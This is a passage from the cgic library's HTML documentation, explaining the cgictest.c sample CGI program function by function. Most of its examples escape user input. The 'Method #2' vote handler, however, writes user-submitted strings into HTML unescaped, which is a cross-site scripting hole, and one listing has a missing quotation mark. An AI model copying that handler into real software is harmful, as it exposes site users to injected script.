will not link properly. Your own\ncode should begin with cgiMain(). The library\nprovides main() for you. (Those who prefer different behavior\ncan easily modify cgic.c.)\n<p>\nConsider the cgiMain function of cgictest.c:\n<p>\n<PRE>\nint cgiMain() {\n#ifdef DEBUG\n  LoadEnvironment();\n#endif /* DEBUG */\n  /* Load a previously saved CGI scenario if that button\n    has been pressed. */\n  if (cgiFormSubmitClicked(\"loadenvironment\") == cgiFormSuccess) {\n    LoadEnvironment();\n  }\n  /* Set any new cookie requested. Must be done *before*\n    outputting the content type. */\n  CookieSet();\n  /* Send the content type, letting the browser know this is HTML */\n  cgiHeaderContentType(\"text/html\");\n  /* Top of the page */\n  fprintf(cgiOut, \"&lt;HTML&gt;&lt;HEAD&gt;\\n\");\n  fprintf(cgiOut, \"&lt;TITLE&gt;cgic test&lt;/TITLE&gt;&lt;/HEAD&gt;\\n\");\n  fprintf(cgiOut, \"&lt;BODY&gt;&lt;H1&gt;cgic test&lt;/H1&gt;\\n\");\n  /* If a submit button has already been clicked, act on the \n    submission of the form. */\n  if ((cgiFormSubmitClicked(\"testcgic\") == cgiFormSuccess) ||\n    cgiFormSubmitClicked(\"saveenvironment\") == cgiFormSuccess)\n  {\n    HandleSubmit();\n    fprintf(cgiOut, \"&lt;hr&gt;\\n\");\n  }\n  /* Now show the form */\n  ShowForm();\n  /* Finish up the page */\n  fprintf(cgiOut, \"&lt;/BODY&gt;&lt;/HTML&gt;\\n\");\n  return 0;\n}\n</PRE>\nNote the DEBUG #ifdef. If DEBUG is defined at compile time, either by\ninserting the line \"#define DEBUG 1\" into the program or by setting\nit in the Makefile or other development environment, then the\nLoadEnvironment function is invoked. This function calls \n<a href=\"#cgiReadEnvironment\">cgiReadEnvironment()</a> \nto restore a captured CGI environment for debugging purposes. See\nalso the discussion of the <a href=\"#debug\">capture</a> program, which is\nprovided for use in CGI debugging. Because this is a test program,\nthe <a href=\"#cgiFormSubmitClicked\">cgiFormSubmitClicked</a> function is\nalso called to check for the use of a button that requests the reloading\nof a saved CGI environment. A completed CGI program typically would\nnever allow the end user to make that decision.\n<h4>Setting Cookies</h4>\nNext, one of the cgiHeader functions should be called.\nThis particular program demonstrates many features, including\nthe setting of cookies. If the programmer wishes to set a cookie,\nthe cookie-setting function must be called\nfirst, before other headers are output. This is done by the\nCookieSet() function of cgictest.c:\n<pre>\nvoid CookieSet()\n{\n  char cname[1024];\n  char cvalue[1024];\n  /* Must set cookies BEFORE calling \n    cgiHeaderContentType */\n  cgiFormString(\"cname\", cname, sizeof(cname));  \n  cgiFormString(\"cvalue\", cvalue, sizeof(cvalue));  \n  if (strlen(cname)) {\n    /* Cookie lives for one day (or until \n      browser chooses to get rid of it, which \n      may be immediately), and applies only to \n      this script on this site. */  \n    cgiHeaderCookieSetString(cname, cvalue,\n      86400, cgiScriptName, cgiServerName);\n  }\n}\n</pre>\nSince this is a test program, the <a href=\"#cgiFormString\">cgiFormString</a> \nfunction is used to fetch the name and value from the form previously filled\nin by the user. Normally, cookie names and values are chosen to meet the\nneeds of the programmer and provide a means of identifying the same\nuser again later.\n<p>\nThe <a href=\"#cgiHeaderCookieSetString\">cgiHeaderCookieSetString</a>\nfunction sets the cookie by requesting that the web browser store it.\n<strong>There is never any guarantee that this will happen!</strong>\nMany browsers reject cookies completely; others do not necessarily keep\nthem as long as requested or return them with their values intact.\nAlways code defensively when using cookies.\n<p>\nThe cname and cvalue parameters are of course the namd and value for\nthe cookie. The third argument is the time, in seconds, that the\ncookie should \"live\" on the browser side before it expires; in this\ncase it has been set to 86,400 seconds, which is exactly one day. \n<strong>The browser may or may not respect this setting, as with everything\nelse about cookies.</strong>\n<p>\nThe fourth argument identifies the \"path\" within the web site for which\nthe cookie is considered valid. A cookie that should be sent back\nfor every access to the site should be set with a path of <code>/</code>.\nIn this case the cookie is relevant only to the CGI program itself, so\n<code><a href=\"#cgiScriptName\">cgiScriptName</a></code> (the URL of the CGI program, not including the\ndomain name) is sent. Similarly, a cookie can be considered relevant\nto a single web site or to an entire domain, such as \n<code>www.boutell.dev</code> or the entire <code>.boutell.dev</code>\ndomain. In this case, the current site on which the program is running\nis the only relevant site, so <code><a href=\"#cgiServerName\">cgiServerName</a></code> is used\nas the domain.\n<h4>Outputting the Content Type Header</h4>\nNext, <a href=\"#cgiHeaderContentType\">cgiHeaderContentType()</a> is \ncalled to indicate the MIME type of the document being output, in this case \n\"text/html\" (a normal HTML document). A few other common MIME types are\n\"image/gif\", \"image/jpeg\" and \"audio/wav\". \n<p>\nNote that <a href=\"#cgiHeaderStatus\">cgiHeaderStatus()</a> or \n<a href=\"#cgiHeaderLocation\">cgiHeaderLocation()</a> could have\nbeen invoked instead to output an error code or redirect the\nrequest to a different URL. Only one of the cgiHeader functions\nshould be called in a single execution of the program.\n<p>\n<strong>Important:</strong> one of the cgiHeader functions,\nusually <a href=\"#cgiHeaderContentType\">cgiHeaderContentType()</a>, \n<em>must</em> be invoked before outputting any other\nresponse to the user. Otherwise, the result will not be a valid\ndocument and the browser's behavior will be unpredictable.\nYou may, of course, output your own ContentType and other\nheader information to <a href=\"#cgiOut\">cgiOut</a> if you prefer. The cgiHeader functions\nare provided as a convenience.\n<h4>Handling Form Submissions</h4>\nLike many CGI programs, cgictest makes decisions about the way it\nshould behave based on whether various submit buttons have been clicked.\nWhen either the testcgic or saveenvironment button is present, cgictest\ninvokes the HandleSubmit function, which invokes additional functions to\nhandle various parts of the form:\n<pre>\nvoid HandleSubmit()\n{\n  Name();\n  Address();\n  Hungry();\n  Temperature();\n  Frogs();\n  Color();\n  Flavors();\n  NonExButtons();\n  RadioButtons();\n  File();\n  Entries();\n  Cookies();\n  /* The saveenvironment button, in addition to submitting \n    the form, also saves the resulting CGI scenario to \n    disk for later replay with the 'load saved environment' \n    button. */\n  if (cgiFormSubmitClicked(\"saveenvironment\") == cgiFormSuccess) {\n    SaveEnvironment();\n  }\n}\n</pre>\n<h4>Handling Text Input</h4>\nThe Name() function of cgictest is shown below, in its simplest\npossible form:\n<PRE>\nvoid Name() {\n        char name[81];\n        <a href=\"#cgiFormStringNoNewlines\">cgiFormStringNoNewlines</a>(\"name\", name, 81);\n        fprintf(cgiOut, \"Name: \");\n        cgicHtmlEscape(name);\n        fprintf(cgiOut, \"<BR>\\n\");\n}\n</PRE>\nThe purpose of this function is to retrieve and display the name that was\ninput by the user. Since the programmer has decided that names should\nbe permitted to have up to 80 characters, a buffer of 81 characters\nhas been declared (allowing for the final null character). \nThe <a href=\"#cgiFormStringNoNewlines\">cgiFormStringNoNewlines()</a>\nfunction is then invoked to retrieve the name and ensure that\ncarriage returns are not present in the name (despite the\nincorrect behavior of some web browsers). The first argument\nis the name of the input field in the form, the second argument\nis the buffer to which the data should be copied, and the third\nargument is the size of the buffer. cgic will never write beyond\nthe size of the buffer, and will always provide a null-terminated\nstring in response; if the buffer is too small, the string will\nbe shortened. If this is not acceptable, the\n<a href=\"#cgiFormStringSpaceNeeded\">cgiFormStringSpaceNeeded()</a>\nfunction can be used to check the amount of space needed; the\nreturn value of cgiFormStringNoNewlines() can also be checked\nto determine whether truncation occurred. See\nthe full description of <a href=\"#cgiFormStringNoNewlines\">\ncgiFormStringNoNewlines()</a>.\n<h4>Handling Output</h4>\nNote that Name() writes its HTML output to <a href=\"#cgiOut\">cgiOut</a>, not\nto stdout.\n<p>\nThe actual name submitted by the user may or may not contain\ncharacters that have special meaning in HTML, specifically the\nthe <code>&lt;</code>, <code>&gt;</code>, and <code>&amp;</code> characters.\nThe <a href=\"#cgiHtmlEscape\">cgiHtmlEscape</a> function is used to output\nthe user-entered name with any occurrences of these characters\ncorrectly escaped as <code>&amp;lt;</code>, <code>&amp;gt;</code>, \nand <code>&amp;amp;</code>.\n<p>\n<strong>Important:</strong> <a href=\"#cgiOut\">cgiOut</a> is normally equivalent\nto stdout, and there is no performance penalty for using it.\nIt is recommended that you write output to <a href=\"#cgiOut\">cgiOut</a> to ensure compatibility\nwith modified versions of the cgic library for special\nenvironments that do not provide stdin and stdout for\neach cgi connection.\n<p>\nNote that, for text input areas in which carriage returns <em>are</em>\ndesired, the function <a href=\"#cgiFormString\">cgiFormString</a>\nshould be used instead. cgiFormString ensures that line breaks\nare always represented by a single carriage return (ascii decimal 13),\nmaking life easier for the programmer. See the source code to\nthe Address() function of cgictest.c for an example.\n<h4>Handling Single Checkboxes</h4>\nConsider the Hungry() function, which determines whether\nthe user has selected the \"hungry\" checkbox:\n<PRE>\nvoid Hungry() {\n        if (<a href=\"#cgiFormCheckboxSingle\">cgiFormCheckboxSingle</a>(\"hungry\") == <a href=\"#cgiFormSuccess\">cgiFormSuccess</a>) {\n                fprintf(cgiOut, \"I'm Hungry!&lt;BR&gt;\\n\");\n        } else {\n                fprintf(cgiOut, \"I'm Not Hungry!&lt;BR&gt;\\n\");\n        }\n}\n</PRE>\nThis function takes advantage of the\n<a href=\"#cgiFormCheckboxSingle\">cgiFormCheckboxSingle()</a> function, which\ndetermines whether a single checkbox has been selected. \ncgiFormCheckboxSingle() accepts the name attribute of the checkbox\nas its sole argument and returns <a href=\"#cgiFormSuccess\">\ncgiFormSuccess</a> if the checkbox is selected, or \n<a href=\"#cgiFormNotFound\">cgiFormNotFound</a> if it is not.\nIf multiple checkboxes with the same name are in use,\nconsider the <a href=\"#cgiFormCheckboxMultiple\">\ncgiFormCheckboxMultiple()</a> and \n<a href=\"#cgiFormStringMultiple\">cgiFormStringMultiple()</a>\nfunctions.\n<h4>Handling Numeric Input</h4>\nNow consider the Temperature() function, which retrieves\na temperature in degrees (a floating-point value) and ensures\nthat it lies within particular bounds:\n<PRE>\nvoid Temperature() {\n        double temperature;\n        <a href=\"#cgiFormDoubleBounded\">cgiFormDoubleBounded</a>(\"temperature\", &amp;temperature, 80.0, 120.0, 98.6);\n        fprintf(<a href=\"#cgiOut\">cgiOut</a>, \"My temperature is %f.&lt;BR&gt;\\n\", temperature);\n}\n</PRE>\nThe temperature is retrieved by the function \n<a href=\"#cgiFormDoubleBounded\">cgiFormDoubleBounded()</a>. The first\nargument is the name of the temperature input field in the form;\nthe second argument points to the address of the variable that will \ncontain the result. The next two arguments are the lower and upper\nbounds, respectively. The final argument is the default value to\nbe returned if the user did not submit a value.\n<p>\nThis function always retrieves a reasonable value within the\nspecified bounds; values above or below bounds are constrained\nto fit the bounds. However, the return value of\ncgiFormDoubleBounded can be checked to make sure the\nactual user entry was in bounds, not blank, and so forth;\nsee the description of <a href=\"#cgiFormDoubleBounded\">\ncgiFormDoubleBounded()</a> for more details. If bounds checking\nis not desired, consider using <a href=\"#cgiFormDouble\">\ncgiFormDouble()</a> instead.\n<p>\nNote that, for integer input, the functions\n<a href=\"#cgiFormInteger\">cgiFormInteger</a> and\n<a href=\"#cgiFormIntegerBounded\">cgiFormIntegerBounded</a>\nare available. The behavior of these functions is similar to\nthat of their floating-point counterparts above.\n<h4>Handling Single-Choice Input</h4>\nThe &lt;SELECT&gt; tag of HTML is used to provide the user with\nseveral choices. Radio buttons and checkboxes can also be used\nwhen the number of choices is relatively small. Consider\nthe Color() function of cgictest.c:\n<PRE>\nchar *colors[] = {\n        \"Red\",\n        \"Green\",\n        \"Blue\"\n};\n\nvoid Color() {\n        int colorChoice;\n        <a href=\"#cgiFormSelectSingle\">cgiFormSelectSingle</a>(\"colors\", colors, 3, &amp;colorChoice, 0);\n        fprintf(<a href=\"#cgiOut\">cgiOut</a>, \"I am: %s&lt;BR&gt;\\n\", colors[colorChoice]);\n}\n</PRE>\nThis function determines which of several colors the user chose\nfrom a &lt;SELECT&gt; list in the form. An array of colors is\ndeclared; the <a href=\"#cgiFormSelectSingle\">cgiFormSelectSingle()</a>\nfunction is then invoked to determine which, if any, of those choices\nwas selected. The first argument indicates the name of the input\nfield in the form. The second argument points to the list of\nacceptable colors. The third argument indicates the number of\nentries in the color array. The fourth argument points to the\nvariable which will accept the chosen color, and the last argument\nindicates the index of the default value to be set if no\nselection was submitted by the browser. \n<p>\n<a href=\"#cgiFormSelectSingle\">cgiFormSelectSingle()</a> will\nalways indicate a reasonable selection value. However, if\nthe programmer wishes to know for certain that a value was\nactually submitted, that the value submitted was a legal\nresponse, and so on, the return value of cgiFormSelectSingle()\ncan be consulted. See the full description of\n<a href=\"#cgiFormSelectSingle\">cgiFormSelectSingle()</a> for\nmore information.\n<p>\nNote that radio button groups and &lt;SELECT&gt; lists can both\nbe handled by this function. If you are processing radio\nbutton groups, you may prefer to invoke \n<a href=\"#cgiFormRadio\">cgiFormRadio()</a>, which functions\nidentically. \n<p>\n<em>\"What if I won't know the acceptable choices at runtime?\"</em>\n<p>\nIf the acceptable choices aren't known <em>until</em> runtime,\none can simply load the choices from disk. But if the acceptable\nchoices aren't fixed at all (consider a list of country names;\nnew names may be added to the form at any time and it is\ninconvenient to also update program code or a separate list\nof countries), simply invoke \n<a href=\"#cgiFormStringNoNewlines\">cgiFormStringNoNewlines()</a>\ninstead to retrieve the string directly. Keep in mind that, if\nyou do so, validating the response to make sure it is\nsafe and legitimate becomes a problem for your own\nprogram to solve. The advantage of cgiFormSelectSingle() is that invalid \nresponses are never returned.\n<p>\nTo handle multiple-selection &lt;SELECT&gt; lists and\ngroups of checkboxes with the same name, see the\ndiscussion of the NonExButtons() function of cgictest.c, immediately below.\n<h4>Handling Multiple-Choice Input</h4>\nConsider the first half of the NonExButtons() function of cgictest.c:\n<PRE>\nchar *votes[] = {\n  \"A\",\n  \"B\",\n  \"C\",\n  \"D\"\n};\n\nvoid NonExButtons() {\n  int voteChoices[4];\n  int i;\n  int result;  \n  int invalid;\n\n  char **responses;\n\n  /* Method #1: check for valid votes. This is a good idea,\n    since votes for nonexistent candidates should probably\n    be discounted... */\n  fprintf(<a href=\"#cgiOut\">cgiOut</a>, \"Votes (method 1):&lt;BR&gt;\\n\");\n  result = <a href=\"#cgiFormCheckboxMultiple\">cgiFormCheckboxMultiple</a>(\"vote\", votes, 4, \n    voteChoices, &amp;invalid);\n  if (result == <a href=\"#cgiFormNotFound\">cgiFormNotFound</a>) {\n    fprintf(<a href=\"#cgiOut\">cgiOut</a>, \"I hate them all!&lt;p&gt;\\n\");\n  } else {  \n    fprintf(<a href=\"#cgiOut\">cgiOut</a>, \"My preferred candidates are:\\n\");\n    fprintf(<a href=\"#cgiOut\">cgiOut</a>, \"&lt;ul&gt;\\n\");\n    for (i=0; (i &lt; 4); i++) {\n      if (voteChoices[i]) {\n        fprintf(<a href=\"#cgiOut\">cgiOut</a>, \"&lt;li&gt;%s\\n\", votes[i]);\n      }\n    }\n    fprintf(<a href=\"#cgiOut\">cgiOut</a>, \"&lt;/ul&gt;\\n\");\n  }\n</PRE>\nThis function takes advantage of\n<a href=\"#cgiFormCheckboxMultiple\">cgiFormCheckboxMultiple()</a>,\nwhich is used to identify one or more selected checkboxes with \nthe same name. This function performs identically to\n<a href=\"#cgiFormSelectMultiple\">cgiFormSelectMultiple()</a>.\nThat is, &lt;SELECT&gt; tags with the MULTIPLE attribute are handled\njust like a group of several checkboxes with the same name.\n<p>\nThe first argument to <a href=\"#cgiFormCheckboxMultiple\">\ncgiFormCheckboxMultiple()</a> is the name given to all\ncheckbox input fields in the group. The second argument\npoints to an array of legitimate values; these should\ncorrespond to the VALUE attributes of the checkboxes\n(or OPTION tags in a &lt;SELECT&gt; list). The third argument\nindicates the number of entries in the array of\nlegitimate values. The fourth argument points to\nan array of integers with the same number of entries\nas the array of legitimate values; each entry\nwill be set true if that checkbox or option was selected,\nfalse otherwise.\n<p>\nThe last argument points to an integer which will be set to the \nnumber of invalid responses (responses not in the array of\nvalid responses) that were submitted. If this value is not\nof interest, the last argument may be a null pointer (0).\n<p>\nNote that the return value of cgiFormCheckboxMultiple is\ninspected to determine whether any choices at all were\nset. See the full description of\n<a href=\"#cgiFormCheckboxMultiple\">cgiFormCheckboxMultiple</a>\nfor other possible return values. \n<p>\n<em>\"What if I won't know the acceptable choices at runtime?\"</em>\n<p>\nIf the acceptable choices aren't known <em>until</em> runtime,\none can simply load the choices from disk. But if the acceptable\nchoices aren't fixed at all (consider a list of ice cream flavors;\nnew names may be added to the form at any time and it is\ninconvenient to also update program code or a separate list\nof countries), a more dynamic approach is needed. Consider\nthe second half of the NonExButtons() function of cgictest.c:\n<PRE>\n  /* Method #2: get all the names voted for and trust them.\n    This is good if the form will change more often\n    than the code and invented responses are not a danger\n    or can be checked in some other way. */\n  fprintf(<a href=\"#cgiOut\">cgiOut</a>, \"Votes (method 2):&lt;BR&gt;\\n\");\n  result = <a href=\"#cgiFormStringMultiple\">cgiFormStringMultiple</a>(\"vote\", &amp;responses);\n  if (result == <a href=\"#cgiFormNotFound\">cgiFormNotFound</a>) {  \n    fprintf(<a href=\"#cgiOut\">cgiOut</a>, \"I hate them all!&lt;p&gt;\\n\");\n  } else {\n    int i = 0;\n    fprintf(<a href=\"#cgiOut\">cgiOut</a>, \"My preferred candidates are:\\n\");\n    fprintf(<a href=\"#cgiOut\">cgiOut</a>, \"&lt;ul&gt;\\n\");\n    while (responses[i]) {\n      fprintf(<a href=\"#cgiOut\">cgiOut</a>, \"&lt;li&gt;%s\\n\", responses[i]);\n      i++;\n    }\n    fprintf(<a href=\"#cgiOut\">cgiOut</a>, \"&lt;/ul&gt;\\n\");\n  }\n  /* We must be sure to free the string array or a memory\n    leak will occur. Simply calling free() would free\n    the array but not the individual strings. The\n    function cgiStringArrayFree() does the job completely. */  \n  <A HREF=\"#cgiStringArrayFree\">cgiStringArrayFree</a>(responses);\n}\n</PRE>\nThis code excerpt demonstrates an alternate means of retrieving\na list of choices. The function\n<a href=\"#cgiFormStringMultiple\">cgiFormStringMultiple()</a> is used\nto retrieve an array consisting of all the strings submitted\nfor with a particular input field name. This works both for\n&lt;SELECT&gt; tags with the MULTIPLE attribute and for \ngroups of checkboxes with the same name. \n<P>\nThe first argument to <a href=\"#cgiFormStringMultiple\">\ncgiFormStringMultiple()</a> is the name of the input field or\ngroup of input fields in question. The second argument should\nbe the address of a pointer to a pointer to a string, which\nisn't as bad as it sounds. Consider the following simple call\nof the function:\n<PRE>\n/* An array of strings; each C string is an array of characters */\nchar **responses; \n\n<a href=\"#cgiFormStringMultiple\">cgiFormStringMultiple</a>(\"vote\", &amp;responses);\n</PRE>\n<em>\"How do I know how many responses there are?\"</em>\n<p>\nAfter the call, the last entry in the string array will be\na null pointer. Thus the simple loop:\n<PRE>\nint i = 0;\nwhile (responses[i]) {\n  /* Do something with the string responses[i] */\n  i++;\n}\n</PRE>\ncan be used to walk through the array until the last\nentry is encountered.\n<p>\n<strong>Important:</strong> the \n<a href=\"#cgiFormStringMultiple\">cgiFormStringMultiple</a> function\nreturns a pointer to <strong>allocated memory</strong>. Your code\nshould not modify the strings in the responses array or the responses\narray itself; if modification is needed, the strings should be\ncopied. When your code is done examining the responses array,\nyou <strong>MUST</strong> call <a href=\"#cgiStringArrayFree\">\ncgiStringArrayFree()</a> with the array as an argument to free the memory \nassociated with the array. Otherwise, the memory will not be available \nagain until the program exists. <strong>Don't</strong> just call the \nfree() function; if you do, the individual strings will not be freed.\n<h4>Accessing Uploaded Files</h4>\nCGIC provides functions to access files that have been uploaded\nas part of a form submission. <strong>IMPORTANT: you MUST</strong> set\nthe <code>enctype</code> attribute of your <code>form</code> tag\nto <code>multipart/form-data</code> for this feature to work! For an\nexample, see the <a href=\"#ShowForm\">ShowForm</a> function of \ncgictest.c, examined below.\n<p>\nThe <code>File</code> function of cgictest.c takes care of \nreceiving uploaded files:\n<pre>\nvoid File()\n{\n  cgiFilePtr file;\n  char name[1024];\n  char contentType[1024];\n  char buffer[1024];\n  int size;\n  int got;\n  if (cgiFormFileName(\"file\", name, sizeof(name)) != \n    cgiFormSuccess) \n  {\n    printf(\"&lt;p&gt;No file was uploaded.&lt;p&gt;\\n\");\n    return;\n  } \n        fprintf(cgiOut, \"The filename submitted was: \");\n        cgiHtmlEscape(name);\n        fprintf(cgiOut, \"&lt;p&gt;\\n\");\n        cgiFormFileSize(\"file\", &size);\n        fprintf(cgiOut, \"The file size was: %d bytes&lt;p&gt;\\n\", size);\n        cgiFormFileContentType(\"file\", contentType, sizeof(contentType));\n        fprintf(cgiOut, \"The alleged content type of the file was: \");\n        cgiHtmlEscape(contentType);\n        fprintf(cgiOut, \"&lt;p&gt;\\n\");\n  fprintf(cgiOut, \"Of course, this is only the claim the browser \"\n    \"made when uploading the file. Much like the filename, \"\n    \"it cannot be trusted.&lt;p&gt;\\n\");\n  fprintf(cgiOut, \"The file's contents are shown here:&lt;p&gt;\\n\");\n  if (cgiFormFileOpen(\"file\", &file) != cgiFormSuccess) {\n    fprintf(cgiOut, \"Could not open the file.&lt;p&gt;\\n\");\n    return;\n  }\n  fprintf(cgiOut, \"&lt;pre&gt;\\n\");\n  while (cgiFormFileRead(file, buffer, sizeof(buffer), &got) ==\n    cgiFormSuccess)\n  {\n    cgiHtmlEscapeData(buffer, got);\n  }\n  fprintf(cgiOut, \"&lt;/pre&gt;\\n\");\n  cgiFormFileClose(file);\n}\n</pre>\nFirst, the File function checks to determine the filename that was\nsubmitted by the user. <strong>VERY IMPORTANT: this filename may or\nmay not bear any relation to the real name of the file on the user's\ncomputer, may be deliberately manipulated with malicious intent,</strong>\nand should not be used for <strong>any</strong> purpose unless you have\ndetermined that its content is safe for your intended use and will not,\nat the very least, overwrite another file of importance to you, especially if\nyou intend to use it as a file name on the server side. The cgic library\nitself does not use this file name for temporary storage.\n<p>\nIf the <a href=\"#cgiFormFileName\">cgiFormFileName</a> function does\nnot succeed, no file was uploaded.\n<p>\nNext, the <a href=\"#cgiFormFileSize\">cgiFormFileSize</a> function is called\nto determine the size of the uploaded file, in bytes.\n<p>\nThe File function then proceeds to query the content type of the uploaded\nfile.  Files uploaded by the user have their own content type information, \nwhich may be useful in determining whether the file is an image, HTML document,\nword processing document, or other type of file. However,\n<strong>as with the filename and any other claim made by the browser,\nthis information should not be blindly trusted.</strong> The browser\nmay upload a file with the name <code>picture.jpg</code> and the\ncontent type <code>image/jpeg</code>, but this does not guarantee that the\nactual file will contain a valid JPEG image suitable for display.\n<p>\nThe content type submitted by the browser can be queried using the\n<a href=\"#cgiFormFileContentType\">cgiFormFileContentType</a> function.\n<p>\nOf course, CGIC also provides access to the actual uploded file. \nFirst, the programmer calls <a href=\"#cgiFormFileOpen\">cgiFormFileOpen</a>,\npassing the address of a <code>cgiFilePtr</code> object. If this function\nsucceeds, the <code>cgiFilePtr</code> object becomes valid, and can be\nused in subsequent calls to <a href=\"#cgiFormFileRead\">cgiFormFileRead</a>.\nNotice that the number of bytes read may be less than the number requested,\nin particular on the last successful call before cgiFormFileRead begins\nto return <code>cgiFormEOF</code>. When cgiFormFileRead no longer returns \ncgiFormSuccess, \nthe programmer calls <a href=\"#cgiFormClose\">cgiFormFileClose</a> to\nrelease the <code>cgiFilePtr</code> object.\n<p>\nThe uploaded file data may contain anything, including binary data,\nnull characters, and so on. The example program uses the \n<a href=\"#cgiHtmlEscapeData\">cgiHtmlEscapeData</a> function to output the\ndata with any special characters that have meaning in HTML escaped.\nMost programs will save the uploaded information to a server-side file or\ndatabase.\n<h4>Fetching All Form Entries</h4>\nFrom time to time, the programmer may not know the names of all\nform fields in advance. In such situations it is convenient to\nuse the <a href=\"#cgiFormEntries\">cgiFormEntries</a> function.\nThe Entries function of cgictest.c demonstrates the use of\ncgiFormEntries:\n<pre>\nvoid Entries()\n{\n        char **array, **arrayStep;\n        fprintf(cgiOut, \"List of All Submitted Form Field Names:&lt;p&gt;\\n\");\n        if (cgiFormEntries(&array) != cgiFormSuccess) {\n                return;\n        }\n        arrayStep = array;\n        fprintf(cgiOut, \"&lt;ul&gt;\\n\");\n        while (*arrayStep) {\n                fprintf(cgiOut, \"&lt;li&gt;\");\n                cgiHtmlEscape(*arrayStep);\n                fprintf(cgiOut, \"\\n\");\n                arrayStep++;\n        }\n        fprintf(cgiOut, \"&lt;/ul&gt;\\n\");\n        cgiStringArrayFree(array);\n}\n</pre>\nThe cgiFormEntries function retrieves an array of form field names.\nThis array consists of pointers to strings, with a final null pointer\nto mark the end of the list. The above code illustrates one way of\nlooping through the returned strings. Note the final call to\n<a href=\"#cgiStringArrayFree\">cgiStringArrayFree</a>, which is\nessential in order to return the memory used to store the strings\nand the string array.\n<h4>Retrieving Cookies</h4>\nThe Cookies function of cgictest.c displays a list of all cookies\nsubmitted by the browser with the current form submission, along\nwith their values:\n<pre>\nvoid Cookies()\n{\n  char **array, **arrayStep;\n  char cname[1024], cvalue[1024];\n  fprintf(cgiOut, \"Cookies Submitted On This Call, With Values \"\n    \"(Many Browsers NEVER Submit Cookies):&lt;p&gt;\\n\");\n  if (cgiCookies(&array) != cgiFormSuccess) {\n    return;\n  }\n  arrayStep = array;\n  fprintf(cgiOut, \"&lt;table border=1&gt;\\n\");\n  fprintf(cgiOut, \"&lt;tr&gt;&lt;th&gt;Cookie&lt;th&gt;Value&lt;/tr&gt;\\n\");\n  while (*arrayStep) {\n    char value[1024];\n    fprintf(cgiOut, \"&lt;tr&gt;\");\n    fprintf(cgiOut, \"&lt;td&gt;\");\n    cgiHtmlEscape(*arrayStep);\n    fprintf(cgiOut, \"&lt;td&gt;\");\n    cgiCookieString(*arrayStep, value, sizeof(value));\n    cgiHtmlEscape(value);\n    fprintf(cgiOut, \"\\n\");\n    arrayStep++;\n  }\n  fprintf(cgiOut, \"&lt;/table&gt;\\n\");\n  cgiFormString(\"cname\", cname, sizeof(cname));  \n  cgiFormString(\"cvalue\", cvalue, sizeof(cvalue));  \n  if (strlen(cname)) {\n    fprintf(cgiOut, \"New Cookie Set On This Call:&lt;p&gt;\\n\");\n    fprintf(cgiOut, \"Name: \");  \n    cgiHtmlEscape(cname);\n    fprintf(cgiOut, \"Value: \");  \n    cgiHtmlEscape(cvalue);\n    fprintf(cgiOut, \"&lt;p&gt;\\n\");\n    fprintf(cgiOut, \"If your browser accepts cookies \"\n      \"(many do not), this new cookie should appear \"\n      \"in the above list the next time the form is \"\n      \"submitted.&lt;p&gt;\\n\"); \n  }\n  cgiStringArrayFree(array);\n}\n</pre>\n<strong>VERY IMPORTANT: YOUR BROWSER MIGHT NOT SUBMIT COOKIES,\nEVER, REGARDLESS OF WHAT VALUES YOU ENTER INTO THE TEST FORM.</strong>\nMany, many browsers are configured not to accept or send cookies;\nothers are configured to send them as little as possible to meet the\nbare minimum requirements for entry into popular sites. Users will often\nrefuse your cookies; make sure your code still works in that situation!\n<p>\nThe above code uses the <a href=\"#cgiCookies\">cgiCookies</a> function\nto retrieve a list of all currently set cookies as a null-terminated\narray of strings. The <a href=\"#cgiCookieString\">cgiCookieString</a>\nfunction is then used to fetch the value associated with each cookie;\nthis function works much like <a href=\"#cgiFormString\">cgiFormString</a>,\ndiscussed earlier. Note that a cookie set as a part of the current\nform submission process does not appear on this list immediately, as\nit has not yet been sent back by the browser. It should appear on\nfuture submissions, provided that the browser chooses to accept\nand resend the cookie at all.\n<h4>Displaying a Form That Submits to the Current Program</h4>\nCGI programmers often need to display HTML pages as part of the output\nof CGI programs; these HTML pages often contain forms which should submit\nfields back to the same program they came from. Provided that your\nweb server is well-configured, this can be done conveniently using\nthe cgiScriptName environment variable, as shown below. Here is the\nsource code of the ShowForm function of cgictest.c:\n<pre>\nvoid ShowForm()\n{\n  fprintf(cgiOut, \"&lt;!-- 2.0: multipart/form-data is required \n    \"for file uploads. --&gt;\");\n  fprintf(cgiOut, \"&lt;form method=\\\"POST\\\" \"\n    \"enctype=\\\"multipart/form-data\\\" \");\n  fprintf(cgiOut, \"  action=\\\"\");\n  cgiValueEscape(cgiScriptName);\n  fprintf(cgiOut, \"\\\"&gt;\\n\");\n  fprintf(cgiOut, \"&lt;p&gt;\\n\");\n  fprintf(cgiOut, \"Text Field containing Plaintext\\n\");\n  fprintf(cgiOut, \"&lt;p&gt;\\n\");\n  fprintf(cgiOut, \"&lt;input type=\\\"text\\\" name=\\\"name\\\"&gt;Your Name\\n\");\n  fprintf(cgiOut, \"&lt;p&gt;\\n\");\n  fprintf(cgiOut, \"Multiple-Line Text Field\\n\");\n  fprintf(cgiOut, \"&lt;p&gt;\\n\");\n  fprintf(cgiOut, \"&lt;textarea NAME=\\\"address\\\" ROWS=4 COLS=40&gt;\\n\");\n  fprintf(cgiOut, \"Default contents go here. \\n\");\n  fprintf(cgiOut, \"&lt;/textarea&gt;\\n\");\n  fprintf(cgiOut, \"&lt;p&gt;\\n\");\n  fprintf(cgiOut, \"Checkbox\\n\");\n  fprintf(cgiOut, \"&lt;p&gt;\\n\");\n  fprintf(cgiOut, \"&lt;input type=\\\"checkbox\\\" name=\\\"hungry\\\" checked&gt;Hungry\\n\");\n  fprintf(cgiOut, \"&lt;p&gt;\\n\");\n  fprintf(cgiOut, \"Text Field containing a Numeric Value\\n\");\n  fprintf(cgiOut, \"&lt;p&gt;\\n\");\n  fprintf(cgiOut, \"&lt;input type=\\\"text\\\" name=\\\"temperature\\\" value=\\\"98.6\\\"&gt;\\n\");\n  fprintf(cgiOut, \"Blood Temperature (80.0-120.0)\\n\");\n  fprintf(cgiOut, \"&lt;p&gt;\\n\");\n  fprintf(cgiOut, \"Text Field containing an Integer Value\\n\");\n  fprintf(cgiOut, \"&lt;p&gt;\\n\");\n  fprintf(cgiOut, \"&lt;input type=\\\"text\\\" name=\\\"frogs\\\" value=\\\"1\\\"&gt;\\n\");\n  fprintf(cgiOut, \"Frogs Eaten\\n\");\n  fprintf(cgiOut, \"&lt;p&gt;\\n\");\n  fprintf(cgiOut, \"Single-SELECT\\n\");\n  fprintf(cgiOut, \"&lt;br&gt;\\n\");\n  fprintf(cgiOut, \"&lt;select name=\\\"colors\\\"&gt;\\n\");\n  